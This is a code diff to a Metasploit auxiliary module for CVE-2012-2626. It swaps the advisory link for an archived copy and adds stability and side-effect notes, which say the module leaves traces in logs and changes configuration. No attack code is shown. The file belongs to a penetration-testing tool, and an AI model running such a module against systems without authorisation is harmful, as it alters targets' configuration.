@@ -19,7 +19,7 @@ class MetasploitModule < Msf::Auxiliary
         'References' => [
           [ 'CVE', '2012-2626' ],
           [ 'OSVDB', '84318' ],
-          [ 'URL', 'https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt' ]
+          [ 'URL', 'http://web.archive.org/web/20130827051639/https://www.trustwave.com/spiderlabs/advisories/TWSL2012-014.txt' ]
         ],
         'Author' => [
           'MC',
@@ -28,7 +28,12 @@ class MetasploitModule < Msf::Auxiliary
           'sinn3r'
         ],
         'License' => MSF_LICENSE,
-        'DisclosureDate' => '2012-07-27'
+        'DisclosureDate' => '2012-07-27',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+          'Reliability' => []
+        }
       )
     )
 
